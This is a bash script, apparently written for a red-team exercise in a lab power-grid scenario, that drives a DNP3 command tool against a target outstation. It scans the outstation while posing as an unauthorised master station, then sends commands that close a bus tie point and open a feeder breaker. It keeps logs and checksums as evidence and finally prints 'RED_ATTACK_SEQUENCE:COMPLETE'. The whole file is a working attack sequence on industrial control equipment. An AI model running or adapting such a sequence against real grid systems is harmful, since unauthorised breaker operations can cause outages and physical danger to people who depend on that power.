#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'
TARGET="${1:-${TARGET:-}}"
[[ -n "$TARGET" ]] || { echo "Usage: $0 <SCENARIO_3_TARGET_IP>" >&2; exit 2; }
DNP3="${DNP3:-}"
if [[ -z "$DNP3" ]]; then
  for candidate in /opt/prabal-red-tools/prabal-dnp3-command /opt/prabal-urja/scenario3/bin/prabal-dnp3-command; do
    [[ -x "$candidate" ]] && DNP3="$candidate" && break
  done
fi
[[ -n "$DNP3" && -x "$DNP3" ]] || { echo "Set DNP3=/path/to/prabal-dnp3-command" >&2; exit 1; }
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
EVIDENCE_DIR="${EVIDENCE_DIR:-$PWD/red-evidence-$STAMP}"
mkdir -p "$EVIDENCE_DIR"
run_scan(){ local master="$1" output="$2"; timeout 20 "$DNP3" --host "$TARGET" --port 20001 --master "$master" --outstation 10 --action scan | tee "$output"; grep -q SCAN_COMPLETED "$output"; }
echo "[1/5] Scan as maintenance master 2"; run_scan 2 "$EVIDENCE_DIR/scan-master2.log"
echo "[2/5] Scan as unexpected master 77"; run_scan 77 "$EVIDENCE_DIR/scan-master77.log"
echo "[3/5] Close bus tie point 1"; timeout 20 "$DNP3" --host "$TARGET" --port 20001 --master 77 --outstation 10 --action close --point 1 | tee "$EVIDENCE_DIR/close-bus-tie.log"
sleep 5
echo "[4/5] Open Feeder A point 0"; timeout 20 "$DNP3" --host "$TARGET" --port 20001 --master 77 --outstation 10 --action open --point 0 | tee "$EVIDENCE_DIR/open-feeder-a.log"
sleep 6
echo "[5/5] Final integrity scan"; run_scan 77 "$EVIDENCE_DIR/final-scan.log"
(cd "$EVIDENCE_DIR" && find . -maxdepth 1 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 -r sha256sum > SHA256SUMS)
echo "RED_ATTACK_SEQUENCE:COMPLETE"
echo "EVIDENCE_DIR:$EVIDENCE_DIR"
